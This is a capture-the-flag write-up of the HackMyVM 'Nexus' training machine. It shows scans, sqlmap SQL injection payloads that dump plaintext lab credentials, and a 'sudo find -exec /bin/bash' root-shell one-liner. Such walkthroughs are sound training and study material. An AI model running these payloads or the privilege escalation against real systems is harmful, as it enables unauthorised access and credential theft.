# Nexus

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Nexus | ShellDredd | Beginner | HackMyVM |

**Summary:** The exploitation of Nexus began with a technical discovery phase where a network scan identified the target IP address, followed by a comprehensive port enumeration revealing active SSH and HTTP services. Web directory fuzzing led to the discovery of a login portal that leaked sensitive database errors when tested with a single quote, confirming the presence of an SQL injection vulnerability. I utilized an automated tool to dump the contents of the Nebuchadnezzar database, successfully retrieving credentials for the user shelly. After gaining initial access via SSH, I performed local enumeration and found that the user had sudo privileges for the find utility. Exploiting this misconfiguration granted root access to the system. The final step required extracting the root flag from an image file using string analysis to reveal hidden text within the binary data.

---

## Reconnaissance

The initial phase involved scanning the local network to identify the target machine. I used a custom PowerShell script to find the IP address of the VirtualBox instance.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.186 08:00:27:20:AC:A7 VirtualBox
```

With the target IP identified as 192.168.100.186, I performed a full port scan using Nmap to identify running services and their versions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nexus]
└─$ nmap -sV -sC -p- 192.168.100.186 -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 18:25 WIB
Nmap scan report for 192.168.100.186
Host is up (0.0076s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA)
|_  256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.63 seconds
```

The scan revealed an Apache web server on port 80 and an SSH service on port 22. I proceeded to perform directory fuzzing with feroxbuster to uncover hidden web assets.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nexus]
└─$ feroxbuster -u http://192.168.100.186/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,txt,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.186/
 🚩  In-Scope Url          │ 192.168.100.186
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       47l       86w      825c http://192.168.100.186/
200      GET       47l       86w      825c http://192.168.100.186/index.html
200      GET     1641l     5430w    75134c http://192.168.100.186/index2.php
200      GET       26l       36w      352c http://192.168.100.186/login.php
```

## Vulnerability Discovery

Upon exploring the discovered pages, I located an authorization panel on the site.

![](image.png)

I tested the login form for potential SQL injection by submitting a single quote character in the username field. The application responded with a verbose MariaDB error message, confirming the vulnerability.

`Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'a'' at line 1 in /var/www/html/login.php:22 Stack trace: #0 /var/www/html/login.php(22): mysqli->query() #1 {main} thrown in /var/www/html/login.php on line 22`

I captured the login request to a file named r.txt for use with sqlmap.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nexus]
└─$ cat r.txt
POST /login.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: id,en-US;q=0.9,en;q=0.8,id-ID;q=0.7,la;q=0.6
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 21
Content-Type: application/x-www-form-urlencoded
Host: 192.168.100.186
Origin: http://192.168.100.186
Referer: http://192.168.100.186/auth-login.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36

user=admin&pass=admin
```

I then used sqlmap to automate the extraction of database names.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nexus]
└─$ sqlmap -r r.txt --dbs --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:39:35 /2026-05-10/

[18:39:35] [INFO] parsing HTTP request from 'r.txt'
[18:39:35] [INFO] testing connection to the target URL
[18:39:35] [INFO] testing if the target URL content is stable
[18:39:36] [INFO] target URL content is stable
[18:39:36] [INFO] testing if POST parameter 'user' is dynamic
[18:39:36] [WARNING] POST parameter 'user' does not appear to be dynamic
[18:39:36] [INFO] heuristic (basic) test shows that POST parameter 'user' might be injectable (possible DBMS: 'MySQL')
[18:39:36] [INFO] testing for SQL injection on POST parameter 'user'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[18:39:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:39:36] [WARNING] reflective value(s) found and filtering out
[18:39:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:39:36] [INFO] testing 'Generic inline queries'
[18:39:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:39:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:39:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:39:38] [INFO] POST parameter 'user' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="Acceso denegado.")
[18:39:38] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:39:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:39:38] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:39:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:39:38] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:39:38] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[18:39:38] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[18:39:38] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[18:39:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:39:38] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:39:38] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:39:38] [INFO] POST parameter 'user' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
[18:39:38] [INFO] testing 'MySQL inline queries'
[18:39:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:39:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:39:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:39:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:39:38] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[18:39:38] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[18:39:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:39:48] [INFO] POST parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[18:39:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:39:48] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[18:39:48] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:39:48] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:39:48] [INFO] target URL appears to have 3 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[18:39:48] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[18:39:48] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[18:39:49] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[18:39:49] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[18:39:49] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[18:39:50] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[18:39:50] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[18:39:51] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[18:39:51] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[18:39:51] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[18:39:51] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 364 HTTP(s) requests:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: user=admin%' OR NOT 7679=7679#&pass=admin

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: user=admin%' AND EXTRACTVALUE(3435,CONCAT(0x5c,0x717a6a7671,(SELECT (ELT(3435=3435,1))),0x71786a7a71)) AND 'mBzY%'='mBzY&pass=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin%' AND (SELECT 4090 FROM (SELECT(SLEEP(5)))CURR) AND 'FXAp%'='FXAp&pass=admin
---
[18:39:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:39:51] [INFO] fetching database names
[18:39:51] [INFO] retrieved: 'information_schema'
[18:39:51] [INFO] retrieved: 'sion'
[18:39:51] [INFO] retrieved: 'mysql'
[18:39:51] [INFO] retrieved: 'performance_schema'
[18:39:51] [INFO] retrieved: 'Nebuchadnezzar'
[18:39:51] [INFO] retrieved: 'sys'
available databases [6]:
[*] information_schema
[*] mysql
[*] Nebuchadnezzar
[*] performance_schema
[*] sion
[*] sys

[18:39:51] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/192.168.100.186'
[18:39:51] [WARNING] your sqlmap version is outdated

[*] ending @ 18:39:51 /2026-05-10/
```

I selected the Nebuchadnezzar database and listed its tables.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nexus]
└─$ sqlmap -r r.txt -D Nebuchadnezzar --tables --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:45:07 /2026-05-10/

[18:45:07] [INFO] parsing HTTP request from 'r.txt'
[18:45:07] [INFO] resuming back-end DBMS 'mysql'
[18:45:07] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: user=admin%' OR NOT 7679=7679#&pass=admin

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: user=admin%' AND EXTRACTVALUE(3435,CONCAT(0x5c,0x717a6a7671,(SELECT (ELT(3435=3435,1))),0x71786a7a71)) AND 'mBzY%'='mBzY&pass=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin%' AND (SELECT 4090 FROM (SELECT(SLEEP(5)))CURR) AND 'FXAp%'='FXAp&pass=admin
---
[18:45:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:45:07] [INFO] fetching tables for database: 'Nebuchadnezzar'
[18:45:07] [INFO] retrieved: 'users'
Database: Nebuchadnezzar
[1 table]
+-------+
| users |
+-------+

[18:45:07] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/192.168.100.186'
[18:45:07] [WARNING] your sqlmap version is outdated

[*] ending @ 18:45:07 /2026-05-10/
```

Finally, I dumped the entries from the users table, which provided the credentials for the user shelly.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nexus]
└─$ sqlmap -r r.txt -D Nebuchadnezzar -T users --dump --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:46:23 /2026-05-10/

[18:46:23] [INFO] parsing HTTP request from 'r.txt'
[18:46:23] [INFO] resuming back-end DBMS 'mysql'
[18:46:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: user=admin%' OR NOT 7679=7679#&pass=admin

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: user=admin%' AND EXTRACTVALUE(3435,CONCAT(0x5c,0x717a6a7671,(SELECT (ELT(3435=3435,1))),0x71786a7a71)) AND 'mBzY%'='mBzY&pass=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin%' AND (SELECT 4090 FROM (SELECT(SLEEP(5)))CURR) AND 'FXAp%'='FXAp&pass=admin
---
[18:46:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:46:23] [INFO] fetching columns for table 'users' in database 'Nebuchadnezzar'
[18:46:23] [INFO] resumed: 'id'
[18:46:23] [INFO] resumed: 'int(11)'
[18:46:23] [INFO] resumed: 'username'
[18:46:23] [INFO] resumed: 'varchar(50)'
[18:46:23] [INFO] resumed: 'password'
[18:46:23] [INFO] resumed: 'varchar(255)'
[18:46:23] [INFO] fetching entries for table 'users' in database 'Nebuchadnezzar'
[18:46:23] [INFO] retrieved: '1'
[18:46:23] [INFO] retrieved: 'F4ckTh3F4k3H4ck3r5'
[18:46:23] [INFO] retrieved: 'shelly'
[18:46:23] [INFO] retrieved: '2'
[18:46:24] [INFO] retrieved: 'cambiame2025'
[18:46:24] [INFO] retrieved: 'admin'
Database: Nebuchadnezzar
Table: users
[2 entries]
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
| 2  | cambiame2025       | admin    |
+----+--------------------+----------+

[18:46:24] [INFO] table 'Nebuchadnezzar.users' dumped to CSV file '/home/ouba/.local/share/sqlmap/output/192.168.100.186/dump/Nebuchadnezzar/users.csv'
[18:46:24] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/192.168.100.186'
[18:46:24] [WARNING] your sqlmap version is outdated

[*] ending @ 18:46:24 /2026-05-10/
```

## Initial Access

With the recovered credentials for shelly, I logged into the machine via SSH.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/nexus]
└─$ ssh shelly@192.168.100.186
The authenticity of host '192.168.100.186 (192.168.100.186)' can't be established.
ED25519 key fingerprint is: SHA256:r1lUfXxL8Fd1e/Q87Jno3P3xHjMTUwmJlKfcsl0AST8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.186' (ED25519) to the list of known hosts.
**************************************************************
HackMyVM System                                              *
                                                             *
   *  .  . *       *    .        .        .   *    ..        *
 .    *        .   ###     .      .        .            *    *
    *.   *        #####   .     *      *        *    .       *
  ____       *  ######### *    .  *      .        .  *   .   *
 /   /\  .     ###\#|#/###   ..    *    .      *  .  ..  *   *
/___/  ^8/      ###\|/###  *    *            .      *   *    *
|   ||%%(        # }|{  #                                    *
|___|,  \\         }|{                                       *
                                                             *
                                                             *
Wellcome to Nexus Vault.                                     *
**************************************************************



shelly@192.168.100.186's password:


######################
DONT TOUCH MY SYSTEM #
######################
Last login: Thu May  8 22:44:41 2025 from 192.168.1.10
shelly@NexusLabCTF:~$ id
uid=1000(shelly) gid=1000(shelly) grupos=1000(shelly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
shelly@NexusLabCTF:~$ ls -la
total 28
drwx------ 4 shelly shelly 4096 may  8  2025 .
drwxr-xr-x 3 root   root   4096 mar 28  2025 ..
-rw-r--r-- 1 shelly shelly  220 mar 28  2025 .bash_logout
-rw-r--r-- 1 shelly shelly 3530 may  8  2025 .bashrc
drwxr-xr-x 3 shelly shelly 4096 abr 21  2025 .local
-rw-r--r-- 1 shelly shelly  807 mar 28  2025 .profile
drwxr-xr-x 2 root   root   4096 may  8  2025 SA
shelly@NexusLabCTF:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
shelly@NexusLabCTF:~$ ls -la SA
total 12
drwxr-xr-x 2 root   root   4096 may  8  2025 .
drwx------ 4 shelly shelly 4096 may  8  2025 ..
-rw-r--r-- 1 root   root    804 may  8  2025 user-flag.txt
```

## Privilege Escalation

I checked the sudo permissions for the current user and discovered that shelly could run the find utility as root without a password.

```bash
shelly@NexusLabCTF:~$ sudo -l
sudo: unable to resolve host NexusLabCTF: Fallo temporal en la resolución del nombre
Matching Defaults entries for shelly on NexusLabCTF:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=LD_PRELOAD, use_pty

User shelly may run the following commands on NexusLabCTF:
    (ALL) NOPASSWD: /usr/bin/find
```

I exploited the find utility to spawn a root shell.

```bash
shelly@NexusLabCTF:~$ sudo /usr/bin/find . -exec /bin/bash -p \; -quit
root@NexusLabCTF:/home/shelly# cd
root@NexusLabCTF:~# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
NexusLabCTF
```

I successfully retrieved the user flag from the SA directory.

```bash
root@NexusLabCTF:~# cat /home/shelly/SA/user-flag.txt

   ▄█    █▄      ▄▄▄▄███▄▄▄▄    ▄█    █▄
  ███    ███   ▄██▀▀▀███▀▀▀██▄ ███    ███
  ███    ███   ███   ███   ███ ███    ███
 ▄███▄▄▄▄███▄▄ ███   ███   ███ ███    ███
▀▀███▀▀▀▀███▀  ███   ███   ███ ███    ███
  ███    ███   ███   ███   ███ ███    ███
  ███    ███   ███   ███   ███ ███    ███
  ███    █▀     ▀█   ███   █▀   ▀██████▀

HackMyVM
Flag User ::  82k[REDACTED]
```

To find the root flag, I examined the contents of the root directory and discovered an image file. I used the strings utility to extract printable characters from the image, which revealed the hidden flag.

```bash
root@NexusLabCTF:~# ls -la
total 36
drwx------  5 root root 4096 may 10 13:59 .
drwxr-xr-x 18 root root 4096 mar 28  2025 ..
-rw-------  1 root root  104 may 10 13:59 .bash_history
-rw-r--r--  1 root root  571 abr 10  2021 .bashrc
-rw-------  1 root root    0 may  8  2025 .fim_history
drwxr-xr-x  3 root root 4096 abr 19  2025 .local
-rw-------  1 root root    2 abr 19  2025 .mysql_history
-rw-r--r--  1 root root  161 jul  9  2019 .profile
drwxr-xr-x  2 root root 4096 may  8  2025 Sion-Code
drwx------  2 root root 4096 mar 28  2025 .ssh
root@NexusLabCTF:~# ls -la Sion-Code/use-fim-to-root.png
-rw-r--r-- 1 root root 72673 may  8  2025 Sion-Code/use-fim-to-root.png
root@NexusLabCTF:~# which strings
/usr/bin/strings
root@NexusLabCTF:~# strings Sion-Code/use-fim-to-root.png
GIF89a
...
Pt<H4
;HMV-FLAG[[ p3v[REDACTED] ]]
```

---

## Attack Chain Summary
1. Reconnaissance: I performed a network scan to identify the target IP and an Nmap scan to discover open ports 22 and 80.
2. Vulnerability Discovery: I identified an error based SQL injection vulnerability in the login.php portal and used sqlmap to dump user credentials.
3. Exploitation: I established initial access via SSH using the credentials recovered from the MariaDB database for the user shelly.
4. Internal Enumeration: I conducted local system checks and identified a sudo misconfiguration involving the find binary.
5. Privilege Escalation: I leveraged the sudo find permission to obtain a root shell and extracted the final flag hidden within an image file.

